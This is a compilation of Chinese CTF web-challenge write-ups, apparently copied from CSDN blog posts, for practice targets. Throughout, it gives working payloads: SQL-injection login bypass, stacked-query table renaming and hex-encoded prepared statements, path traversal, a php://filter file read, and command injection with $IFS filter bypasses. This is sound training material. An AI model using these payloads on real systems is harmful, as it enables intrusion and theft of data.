# Web

## [极客大挑战 2019]EasySQL 1

网页环境<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697269227979-fd564186-7adb-4eaf-9e3e-8424fdd19fa4.png#averageHue=%230c0c0c&clientId=uf24ad900-2f88-4&from=paste&height=747&id=u1f8820fd&originHeight=934&originWidth=1913&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=569569&status=done&style=none&taskId=u5bf2ca64-b145-4ca8-9fea-76843b29330&title=&width=1530.4)<br />可以看到是一个登录窗口，题目已经说了是SQL注入<br />首先试一下弱口令，admin,123<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697269500707-e261da2b-33fa-446f-b907-e898575facae.png#averageHue=%23100909&clientId=uf24ad900-2f88-4&from=paste&height=747&id=u4b689535&originHeight=934&originWidth=1899&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=576337&status=done&style=none&taskId=ue42bb3eb-811a-4bb8-a5ad-0a9c898c1fb&title=&width=1519.2)<br />提示用户名密码错了<br />既然是第一道题，那应该是很简单了<br />判断是数字型还是字符型

1. 数字型

`and 1=1 回显正常`<br />`and 1=2 返回异常，存在数字型注入可能`

2. 字符型

`1 返回正常`<br />`1' 返回异常，存在字符型注入可能`<br />经过测试，发现username和password两个参数都可以分别注入和同时注入<br />构造payload<br />`url?usename=1'&password=1'`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697270426620-acb3876c-9f0d-4dad-b7b5-b7e2f50b557f.png#averageHue=%230b0a0a&clientId=u50427f58-e377-4&from=paste&height=750&id=uac410499&originHeight=938&originWidth=1916&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=578355&status=done&style=none&taskId=u9824586b-054d-4e84-998e-a4f99a53025&title=&width=1532.8)<br />回显报错，存在SQL字符型注入<br />**小试一下万能密码注入**<br />构造payload<br />`url?usename=1' or '1'='1&password=1' or '1'='1`<br />**回显flag**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697270808644-23610741-6cba-4ccc-ac0d-20688612546d.png#averageHue=%230b0a0a&clientId=u50427f58-e377-4&from=paste&height=746&id=u61a5ec44&originHeight=933&originWidth=1905&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=588001&status=done&style=none&taskId=u34c8a5ee-5cfa-462d-8975-2dd088f61f5&title=&width=1524)<br />![](https://cdn.nlark.com/yuque/0/2023/jpeg/36016220/1697271707206-5d837e64-976e-44fc-b710-05a0ca10dd88.jpeg)

原文链接：https://blog.csdn.net/m0_73734159/article/details/133827153?spm=1001.2014.3001.5501

## [极客大挑战 2019]Havefun 1

网页环境<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697789393846-9148e474-ac05-4ced-8fb6-694a470ae325.png#averageHue=%23aae6da&clientId=udc76d59d-d910-4&from=paste&height=758&id=EPVgZ&originHeight=948&originWidth=1892&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=24499&status=done&style=none&taskId=u09e967db-f466-4bd7-934a-31dcca38159&title=&width=1513.6)<br />title标题<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697789429253-bddc9ec0-be13-4fda-9d05-ca9e24024c6c.png#averageHue=%23fafaf9&clientId=udc76d59d-d910-4&from=paste&height=32&id=u658998dc&originHeight=40&originWidth=242&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2099&status=done&style=none&taskId=u55a9820b-ce79-4425-a498-8d81be75cdd&title=&width=193.6)<br />每一帧都不要放过，或许那个不起眼的地方就存在重要信息<br />到这并未发现什么重要信息，F12看看<br />在源代码底部发现PHP代码：
```php
<!--  
 $cat=$_GET['cat'];  
 echo $cat;  
 if($cat=='dog'){  
 	echo 'Syc{cat_cat_cat_cat}';  
 }  
 --> 
```
**PHP代码审计**
> 1. 通过GET方式进行传参（就是通过URL地址进行传参)，这个参数是cat
> 2. 输出参数cat的值
> 3. if判断语句，当cat=dog的时候即可输出flag

构造payload：<br />`url/?cat=dog`<br />**爆出flag：**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697790811744-a4a7a614-4cf3-4b63-8d0c-984a715f94c8.png#averageHue=%23aae6db&clientId=ua82db3db-7fc5-4&from=paste&height=744&id=uf8feeda1&originHeight=930&originWidth=1882&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=28162&status=done&style=none&taskId=ueef1f1a6-ae40-4e85-84ea-c7cd9dcbb55&title=&width=1505.6)

原文链接：https://blog.csdn.net/m0_73734159/article/details/133977487?spm=1001.2014.3001.5501

## [HCTF 2018]WarmUp 1

题目环境：<br />![image](https://github.com/adm3n-hnt/CTF-Study/assets/79041980/ee5feecb-9dee-4754-bb41-ad6cc4c8d1a5)
<br />发现除了表情包，再无其他<br />F12试试<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697974053018-52fc716e-bc2c-45b6-9c17-2fd96014fb71.png#averageHue=%23fdfcfc&clientId=ub5185c9b-7e11-4&from=paste&height=214&id=u416571cf&originHeight=267&originWidth=673&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15663&status=done&style=none&taskId=u0bff4cc1-b75b-436b-bf23-32bb1aadcaf&title=&width=538.4)<br />发现source.php文件<br />访问这个文件，格式如下：<br />`url/source.php`<br />回显如下：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697974496348-8399c824-58b6-4335-8594-7e880b3324ef.png#averageHue=%23fefdfd&clientId=ub5185c9b-7e11-4&from=paste&height=760&id=u1a03ad0b&originHeight=950&originWidth=1918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=26282&status=done&style=none&taskId=u1cd2ad08-88b9-4eac-a6cc-4519f4012c6&title=&width=1534.4)<br />PHP代码审计：
```php
<?php
highlight_file(__FILE__);
class emmm
{
	public static function checkFile(&$page)
	{
    $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
    if (! isset($page) || !is_string($page)) {
    echo "you can't see it";
    return false;
    }
    
    if (in_array($page, $whitelist)) {
    return true;
    }
    
    $_page = mb_substr(
    $page,
    0,
    mb_strpos($page . '?', '?')
    );
    if (in_array($_page, $whitelist)) {
    return true;
    }
    
    $_page = urldecode($page);
    $_page = mb_substr(
    $_page,
    0,
    mb_strpos($_page . '?', '?')
    );
    if (in_array($_page, $whitelist)) {
    return true;
    }
    echo "you can't see it";
    return false;
  }
}

if (! empty($_REQUEST['file'])
&& is_string($_REQUEST['file'])
&& emmm::checkFile($_REQUEST['file'])
) {
include $_REQUEST['file'];
exit;
} else {
echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
}  
?>
```
> 1. 定义了一个名为emmm的类，该类有一个静态方法checkFile。checkFile方法接受一个字符串参数$page，这个参数可能代表一个文件名。
> 2. 定义了一个$whitelist数组，这个数组里面存在两个元素是"source.php"和"hint.php"。
> 3. checkFile方法首先检查$page是否存在且为字符串。如果不满足这些条件，它将输出"you can't see it"并返回false。
> 4. 然后，checkFile方法检查$page是否存在于一个名为$whitelist的数组中。这个数组包含两个元素，分别是"source.php"和"hint.php"。如果$page在$whitelist中，方法将返回true。
> 5. 如果$page不在$whitelist中，那么checkFile方法将尝试通过以下步骤查找匹配的文件名：
>    - 首先，它将$page和问号(?)连接起来，然后查找这个字符串在$page中的位置。这可能是为了检查是否存在一个查询字符串。
>    - 然后，它对$page进行url解码，再重复之前的步骤。
>    - 如果以上两种方式都未能找到匹配的文件名，那么方法将输出"you can't see it"并返回false。
> 6. 在类的定义之外，这段代码检查了一个名为$_REQUEST['file']的变量。如果这个变量非空且为字符串，并且通过emmm::checkFile($_REQUEST['file'])检查，那么它将包含(include)这个文件并退出。否则，它将显示最初页面的那个滑稽表情包图片。
> 7. 总的来说，给了我们一个参数是file，我们给file参数传值就等于是给page参数传值，传的值需要提前用英文问号（?）连接起来，然后我们就可以找flag，怎么找flag是个问题，但是在代码里面还有一个名为hint.php的文件，不妨去看看，或许有咱们需要的信息。

查看hint.php内容<br />查看格式:<br />`url/hint.php`<br />回显结果：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697975963284-97546441-9786-46ad-9d1f-2599a6599f95.png#averageHue=%23fefefe&clientId=ub5185c9b-7e11-4&from=paste&height=746&id=u305af69c&originHeight=933&originWidth=1890&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=20963&status=done&style=none&taskId=uf4205885-caab-469e-8a98-72d48dae815&title=&width=1512)<br />这里说flag在**ffffllllaaaagggg**文件里面<br />有了目标就好办了，构造下payload：<br />`url/source.php?file=hint.php?/ffffllllaaaagggg`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697976368038-08caff31-561b-487f-b2cc-bc5a8fea83ea.png#averageHue=%23fefefe&clientId=ub5185c9b-7e11-4&from=paste&height=746&id=ue12ed593&originHeight=933&originWidth=1897&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=23883&status=done&style=none&taskId=u72bc8df1-d739-4fd3-9271-f02340f417d&title=&width=1517.6)<br />竟然什么都没有显示<br />**分析一下原因：**
> 1. 首先我们的payload要在source.php文件下进行，因为参数在这里面。
> 2. flag在ffffllllaaaagggg里面，ffffllllaaaagggg又在hint.php里面，并且$whitelist数组里面也存在hint.php文件，所以说要先进到hint.php文件里面。
> 3. 英文问号(?)连接后面的字符串也没有问题
> 4. 到这里payload构造是没有问题的，那么问题就出在了找flag的位置不对！
> 5. 我们这个payload是在hint.php文件里面找的，但是没有，返回上一级找找看？问题是也不知道flag具体在哪一级，那就构造多一些，溢出的部分没关系，这里只会显示最后一个目录。
> 6. 了解一下：
> 
1、“.”表示当前目录，也可以用“./”表示。
> 2、“..”表示上一级目录，也可以用“../”表示。
> 3、“~” 代表用户自己的宿主目录。
> 4、“/”处于Linux文件系统树形结构的最顶端，我们称它为Linux文件系统的root，它是Linux文件系统的入口。

**继续构造payload：**<br />`url/source.php?file=hint.php?../../../../../../ffffllllaaaagggg`<br />这里就是说一直返回上一级查找，直到查找到flag为止，最终返回到/root根目录，因为ffffllllaaaagggg原本是在hint.php文件里面嘛，所以说要一直往上一级目录找它的原始位置，<br />../倒不是一定是6个，看你的flag具体在那个上一级目录了😉<br />上传payload<br />回显结果：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697977284649-5b659143-d504-4ace-b1c1-f09a3d4919c5.png#averageHue=%23fefefe&clientId=ub5185c9b-7e11-4&from=paste&height=740&id=u3c6d46da&originHeight=925&originWidth=1526&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=30633&status=done&style=none&taskId=u126f933d-d65c-40bf-9faa-b9de17c4e02&title=&width=1220.8)<br />**爆出flag：**<br />`flag{89c3539b-c6f4-4454-892a-ff1e460a560b}`

原文链接：https://blog.csdn.net/m0_73734159/article/details/133977524?spm=1001.2014.3001.5501

## [ACTF2020 新生赛]Include 1

题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698134020267-86822c9a-ec92-4a1e-b22c-b2112efdb3ee.png#averageHue=%23ffffff&clientId=u8db967fb-52e9-4&from=paste&height=86&id=u9d2cf06e&originHeight=108&originWidth=292&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=994&status=done&style=none&taskId=u2a26d94d-5aef-4f9d-a33e-dc397f538b3&title=&width=233.6)<br />超链接，点进去看看<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698134074547-c749cc10-31be-4dc9-910d-cc155dd86a47.png#averageHue=%23f9f7f6&clientId=u8db967fb-52e9-4&from=paste&height=60&id=u6e2598e7&originHeight=75&originWidth=359&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2304&status=done&style=none&taskId=ud2595288-51b7-40d9-880f-fbef789bbe0&title=&width=287.2)<br />你能找到flag吗？<br />除了这些网页什么都没有，但是不当紧，因为我们有一双善于发现的眼睛👀<br />F12瞅瞅<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698134230106-8aba5c20-f581-430e-8dfd-3853258a4dec.png#averageHue=%23f7f7f6&clientId=u8db967fb-52e9-4&from=paste&height=60&id=u522e286c&originHeight=75&originWidth=306&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1590&status=done&style=none&taskId=uad68142b-4b70-43fa-ba46-c2420a36283&title=&width=244.8)<br />无，并无其他<br />等等URL看了吗？<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698134295681-4af81dcd-991d-4f0b-9271-c44f9d8c6425.png#averageHue=%23e9e6e4&clientId=u8db967fb-52e9-4&from=paste&height=34&id=ub3d3abb5&originHeight=42&originWidth=705&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=4706&status=done&style=none&taskId=u36343248-7e57-492a-82f6-b3a9e195070&title=&width=564)<br />发现存在一个参数file，并且已经给出flag.php文件了<br />主题题目名称Include，意为文件包含，大部分文件包含都要用到PHP伪协议<br />通过PHP伪协议构造payload：<br />`URL/?file=php:filter/read=convert.base64-encode/resource=flag.php`
> 通过PHP伪协议读取flag.php文件，并通过base64编码格式显示出来
> 想要了解更多PHP伪协议可以看我这篇同类题目，希望对大家的学习有所帮助

[fileclude-CTF 解题思路-CSDN博客](https://blog.csdn.net/m0_73734159/article/details/130383801?spm=1001.2014.3001.5501)<br />回显结果：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698134847514-d4ae6b5a-bcc4-4742-b695-08f4289fc16a.png#averageHue=%23ece7e3&clientId=u8db967fb-52e9-4&from=paste&height=30&id=u3581d467&originHeight=38&originWidth=1524&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=8955&status=done&style=none&taskId=u1d3e4945-1e59-47c4-ae90-de9ac52c5be&title=&width=1219.2)<br />`PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7NDAwZjJiYzYtOGI2Mi00NWEyLTg1ZDQtMmVkYzU0MjY4MTU0fQo=`<br />base64解码一把梭<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698134962350-0b61c7c4-3050-49aa-9554-ff84826c299d.png#averageHue=%23fcfafa&clientId=u8db967fb-52e9-4&from=paste&height=366&id=u4516bb27&originHeight=457&originWidth=1857&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=41230&status=done&style=none&taskId=u58662f99-af00-43ce-825d-3d16d3df8fe&title=&width=1485.6)<br />**得出flag：**<br />`**flag{400f2bc6-8b62-45a2-85d4-2edc54268154}**`

原文链接：https://blog.csdn.net/m0_73734159/article/details/134015081?spm=1001.2014.3001.5501

## [ACTF2020 新生赛]Exec 1

题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698200273276-d8bf8b0f-d18f-4412-bd93-8298fe43b65d.png#averageHue=%23fafafa&clientId=u90f92586-9a2e-4&from=paste&height=217&id=u1ff865d8&originHeight=271&originWidth=422&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=7249&status=done&style=none&taskId=uef777c1e-df70-4229-bccf-479692edf47&title=&width=337.6)<br />是一个ping操作，ping个127.0.0.1试试<br />有回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698200374948-9b9106de-3cb0-456c-bcaf-7b2264745f7e.png#averageHue=%23f7f6f6&clientId=u90f92586-9a2e-4&from=paste&height=362&id=u4c09c0b6&originHeight=453&originWidth=737&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=29419&status=done&style=none&taskId=uc6f6b8d9-8e81-4db6-b0a6-ce484f5868b&title=&width=589.6)<br />**看起来有点像PWN的题，猜测通过列出目录文件，是否存在flag文件，并查看文件内容，并且存在两种方法解题，一种是管道符，一种是堆叠查询**
<a name="kJ9SD"></a>
### **第一种、管道符**
列出目录文件<br />`127.0.0.1 | ls`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698200626535-7603173b-89cb-467f-8a80-dd326dc6b9ec.png#averageHue=%23fbfafa&clientId=u90f92586-9a2e-4&from=paste&height=238&id=udc3c072c&originHeight=298&originWidth=608&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=14860&status=done&style=none&taskId=ua96231c2-f06f-4b22-bcfc-c615a685d0b&title=&width=486.4)<br />列出隐藏文件<br />`127.0.0.1 | ls -a`<br />发现存在上级目录<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698200737957-c7c1e57b-81ab-4f32-9b73-1132755e7e9f.png#averageHue=%23f9f9f9&clientId=u90f92586-9a2e-4&from=paste&height=272&id=u7222c59c&originHeight=340&originWidth=509&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=13679&status=done&style=none&taskId=u5eb2e479-1d42-4f90-9d87-1e77f1909cc&title=&width=407.2)<br />因此可以看出，此处命令执行并不是在root/根目录下进行的\<br />列出/根目录下的目录文件<br />`127.0.0.1 | ls /`![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698200911159-c35404fc-a613-4749-a295-af252df9ab3f.png#averageHue=%23f7f7f6&clientId=u90f92586-9a2e-4&from=paste&height=542&id=u541df299&originHeight=677&originWidth=758&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=22769&status=done&style=none&taskId=u119b73cc-c464-4645-8912-76002e2bfb9&title=&width=606.4)<br />存在flag，查看根目录下flag文件的内容<br />`127.0.0.1 | cat /flag`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698201091955-da441925-18eb-4b20-a3bc-3d787212779f.png#averageHue=%23fafaf9&clientId=u90f92586-9a2e-4&from=paste&height=235&id=u18dbeba0&originHeight=294&originWidth=551&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=13795&status=done&style=none&taskId=uc0310f77-164d-4d25-9277-7434ed2f55b&title=&width=440.8)<br />**得出flag：**<br />`**flag{ce0a3875-bc2a-49f9-b285-dccdf195531b}**`

<a name="OH7u8"></a>
### **第二种、堆叠查询**
列出当前目录文件；列出隐藏文件；列出根目录下的文件；查看根目录下flag文件的内容<br />`127.0.0.1;ls;ls -a;ls /;cat /flag`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698201726844-14a619f6-1821-472c-ac35-9a2ee3f40d45.png#averageHue=%23f5f5f5&clientId=u90f92586-9a2e-4&from=paste&height=758&id=ufa57bd66&originHeight=948&originWidth=1063&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=66837&status=done&style=none&taskId=u995fe147-fc69-4add-b6b4-fa09bff2b73&title=&width=850.4)<br />**得出flag：**<br />`**flag{ce0a3875-bc2a-49f9-b285-dccdf195531b}**`<br />两种方法可以看出有明显的不同

原文链接：https://blog.csdn.net/m0_73734159/article/details/134029479?spm=1001.2014.3001.5501

## [GXYCTF2019]Ping Ping Ping 1

题目环境<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698213860659-24b1340b-4b31-4179-858c-eb21e6fe7ca6.png#averageHue=%23fdfdfd&clientId=ub5d3c2c2-2e29-4&from=paste&height=80&id=u3cb957d5&originHeight=100&originWidth=194&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=942&status=done&style=none&taskId=u709bb2d6-dff9-4f14-9762-6572d3ef5d6&title=&width=155.2)
> 给了一个ip参数
> 注意题目Ping Ping Ping
> 意思就是让我们进行Ping地址
> 随便输入一个地址Ping一下

`URL?ip=0`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698214503187-24afc92e-d4f5-44d8-9357-7ee5cc42073e.png#averageHue=%23f2f2f2&clientId=ub5d3c2c2-2e29-4&from=paste&height=194&id=u2f328aee&originHeight=243&originWidth=509&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=6638&status=done&style=none&taskId=u2b46f94e-eb00-44b7-8783-39f777d4836&title=&width=407.2)
> 有回显结果，和上题类似
> [[ACTF2020 新生赛]Exec 1-CSDN博客](https://blog.csdn.net/m0_73734159/article/details/134029479?spm=1001.2014.3001.5501)

查看当前目录文件<br />`URL?ip=0;ls`（这里使用堆叠注入查询）<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698215336545-0196e2f9-1197-4aec-9d73-1d7e2291aa10.png#averageHue=%23f3f3f3&clientId=ub5d3c2c2-2e29-4&from=paste&height=208&id=u8bb77e42&originHeight=260&originWidth=514&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=11528&status=done&style=none&taskId=u7270158f-a2c2-489e-9e04-e52847199ac&title=&width=411.2)<br />直接给出了咱们flag文件，事实上真的有这么简单吗？<br />查看flag文件看看是什么情况<br />`URL?ip=0;cat flag.php`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698215574532-4eb59f0a-d7cc-4a5b-96f3-92ca289c26b1.png#averageHue=%23f4f1f0&clientId=ub5d3c2c2-2e29-4&from=paste&height=33&id=u90d497d1&originHeight=41&originWidth=286&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1795&status=done&style=none&taskId=u4cc81793-fcc6-408e-990d-ff9c9573b39&title=&width=228.8)<br />空格报错！<br />查看flag关键字是否被过滤<br />`URL?ip=0;flag.php`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698216109157-fca1c30b-1dc9-40e2-9fde-9362e959bce4.png#averageHue=%23f6f4f2&clientId=ub5d3c2c2-2e29-4&from=paste&height=50&id=ub5b17a0d&originHeight=62&originWidth=223&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1798&status=done&style=none&taskId=ue0d0ebcc-17bb-424b-9b52-b49ae68ee50&title=&width=178.4)<br />flag报错！<br />查看字符是否被过滤<br />`URL?ip=0;/`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698216192362-6f85930f-085f-4100-aa36-0f36e2f4d802.png#averageHue=%23f5f3f1&clientId=ub5d3c2c2-2e29-4&from=paste&height=42&id=u65550639&originHeight=53&originWidth=276&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2005&status=done&style=none&taskId=u4032e5b2-9131-4d9f-b41b-270633e2eee&title=&width=220.8)<br />字符报错！<br />好啊好啊，过滤这么多东西，不过好在/符号不用绕过了，因为flag就在当前目录<br />**空格绕过**
> 1. cat${IFS}flag.txt 
> 2. cat$IFS$9flag.txt （正整数可以是任意）
> 3. cat<flag.txt 
> 4. cat<>flag.txt
> 5.  {cat,flag.txt}

**flag关键字绕过**
> 可以使用定义变量绕过
> $x=ag
> fa$x=flag

**构造payload：**<br />`**URL?ip=0;x=ag;cat${IFS}fl$x.php**`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698219076973-3a184aa5-455d-4a45-a589-0efebf7fb4a3.png#averageHue=%23f7f5f3&clientId=ub5d3c2c2-2e29-4&from=paste&height=38&id=u7ebe6899&originHeight=48&originWidth=350&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2073&status=done&style=none&taskId=u83d5b49d-311e-45fb-bc3b-237b51d3596&title=&width=280)<br />字符报错！<br />猜测"{}"被过滤<br />试试第二种空格绕过方法<br />**构造payload:**<br />`**URL?ip=0;x=ag;cat$IFS$1fl$x.php**`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698219718651-776f6cfd-2a1b-4bf7-a8bd-8bec0412f405.png#averageHue=%23f4f4f4&clientId=ub5d3c2c2-2e29-4&from=paste&height=194&id=ube092bab&originHeight=242&originWidth=572&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=6709&status=done&style=none&taskId=u9d310f28-ddb7-4529-ab14-a89be2deda3&title=&width=457.6)<br />**有回显结果，绕过成功，但是没有发现flag，F12查看网页源代码，看看有没有flag**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698219743590-733bf4b1-15e3-4bad-8374-3d6e45d77975.png#averageHue=%23f4f4f4&clientId=ub5d3c2c2-2e29-4&from=paste&height=216&id=u3ab197a6&originHeight=270&originWidth=581&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=12592&status=done&style=none&taskId=u9dcd84a9-a474-4ab9-ad31-1246b948b85&title=&width=464.8)<br />**得出flag：**<br />`flag{08512195-033d-4f18-a5b0-00dcbc58c4b8}`

原文链接：https://blog.csdn.net/m0_73734159/article/details/134036632?spm=1001.2014.3001.5501

## [强网杯 2019]随便注 1(超详细，三种解法）

<a name="evxPg"></a>
### **第一种解法 堆叠注入**
网页环境<br />![image.png](https://img-blog.csdnimg.cn/img_convert/434cfacea88d014f556ac56fdbb36d36.png)<br />判断是否是字符型注入<br />`1'`<br />![image.png](https://img-blog.csdnimg.cn/img_convert/2e8bc28f595dbd11974934fa20cfa369.png)<br />判断是否存在关键字过滤<br />`select`<br />![image.png](https://img-blog.csdnimg.cn/img_convert/2c4f19b88e0523022badbf2d4d7d92ec.png)<br />联合查询被过滤，只能用堆叠注入了<br />查看有几个字段<br />`1' order by 2#`<br />![image.png](https://img-blog.csdnimg.cn/img_convert/e3ca73027a6fe25e7ae0afa4bda848c9.png)<br />正常回显<br />`1' order by 3#`![image.png](https://img-blog.csdnimg.cn/img_convert/895055b725e189d42fe79ffc45702f31.png)<br />回显报错，可以看出只有两个字段<br />查看所有数据库<br />`1'; show databases;`<br />![image.png](https://img-blog.csdnimg.cn/img_convert/823d4fa00155a99b585dde3cf3cef82e.png)<br />查看所有数据表<br />`1'; show tables;`<br />![image.png](https://img-blog.csdnimg.cn/img_convert/b56eead234c1e36df2c5049451dec8a1.png)<br />爆words数据表的字段<br />`1';show columns from words;#`![image.png](https://img-blog.csdnimg.cn/img_convert/72352caabc7e406ed88ce07fb607b3c5.png)<br />爆1919810931114514数据表字段（注意数据表为数字的时候需要用反引号括起来）<br />`1';show columns from `1919810931114514`;#`<br />![image.png](https://img-blog.csdnimg.cn/img_convert/014d47d3f850c8e809957090e00fb188.png)<br />可以看到这两个表words表有两个字段，而另一个只有一个字段<br />后台SQL查询语句应该是：<br />`select * from words where id=`<br />所以说只能先查询id字段，然而另一个表只有一个flag字段是肯定爆不了flag的，并且类型为varchar字符串类型，而恰巧words数据表里面的data也是varchar类型，因此从这里就可以得到做题思路，通过rename函数进行改表，把`1919810931114514`改为words，增加新字段id，将flag改为data，将刚开始那个words表改为其他任意表。<br />构造payload：<br />`1';rename table words to BaiMao;rename table `1919810931114514` to words;alter table words add id int unsigned not NULL auto_increment primary key;alter table words change flag data varchar(100);#`
> rename修改表名
> alter修改已知的列
> add增加
> int整数类型
> unsigned无符号类型
> **not null**- 指示某列不能存储 NULL 值。
> **primary key** - NOT NULL 和 UNIQUE 的结合。指定主键，确保某列（或多个列的结合）有唯一标识，每个表有且只有一个主键。
> **auto_increment**-自动赋值，默认从1开始。

成功回显flag：<br />![image.png](https://img-blog.csdnimg.cn/img_convert/8122d53a32c6179d396ce793725a8a9c.png)<br />注意没有回显flag，就类似于你更新了个东西但是没刷新，重新在文本框里面输入1提交即可回显flag。
<a name="z4q8F"></a>
### 第二种解法 编码逃逸 绕过滤
由于select被过滤，考虑使用编码进行绕过<br />使用select查询就很简单了<br />构造payload<br />`select *from where `1919810931114514``（注意这里使用反引号把这个数字包括住，md编辑器打不上去） <br />*号查询数据表里面的全部内容，这就是爆出flag的原理<br />进行16进制编码加密<br />`73656c656374202a2066726f6d20603139313938313039333131313435313460`<br />最终payload：<br />`1';SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#`
> - prepare…from…是预处理语句，会进行编码转换。
> - execute用来执行由SQLPrepare创建的SQL语句。
> - SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。
> - 0x就是把后面的编码格式转换成16进制编码格式
> - 那么总体理解就是，使用SeT方法给变量a赋值，给a变量赋的值就是select查询1919810931114514表的所有内容语句编码后的值，execsql方法执行来自a变量的值，prepare...from方法将执行后的编码变换成字符串格式，execute方法调用并执行execsql方法。
参考：https://blog.csdn.net/qq_44657899/article/details/10323914

回显flag：<br />![image.png](https://img-blog.csdnimg.cn/img_convert/d9511654ed16ddd5152c6598b5fecbde.png)
<a name="E2zV0"></a>
### 第三种解法 handler代替select
select命令被过滤了怎么办？我们还可以用handler命令进行查看，handler命令可以一行一行的显示数据表中的内容。<br />构造payload：<br />`1'; handler `1919810931114514` open as `a`; handler `a` read next;#`
> handler代替select，以一行一行显示内容
> open打开表
> as更改表的别名为a
> read next读取数据文件内的数据次数

上传payload，回显flag：<br />![image.png](https://img-blog.csdnimg.cn/img_convert/1aa5220a282ceac998065c80dc38af21.png)

原文链接：https://blog.csdn.net/m0_73734159/article/details/134049744?spm=1001.2014.3001.5501

## [SUCTF 2019]EasySQL 1

题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698664486260-6f6c0019-9130-4140-a1b2-9cceb09022f5.png#averageHue=%23f8f7f5&clientId=u0afe607f-2d1f-4&from=paste&height=202&id=uf83fd9bc&originHeight=253&originWidth=876&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=21417&status=done&style=none&taskId=u889268b8-2948-42df-b872-3ff591d0b4b&title=&width=700.8)
> 把你的旗子给我，我会告诉你旗子是不是对的。

判断注入类型<br />`1'`<br />回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698664852183-4cfdd7bb-3ea9-4ce9-be1c-96f1fa803094.png#averageHue=%23f6f4f2&clientId=u0afe607f-2d1f-4&from=paste&height=150&id=uccc2f919&originHeight=187&originWidth=872&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=21241&status=done&style=none&taskId=ub4f7196d-1f32-4f95-9828-3ef2dcffc4d&title=&width=697.6)
> 不是字符型SQL注入

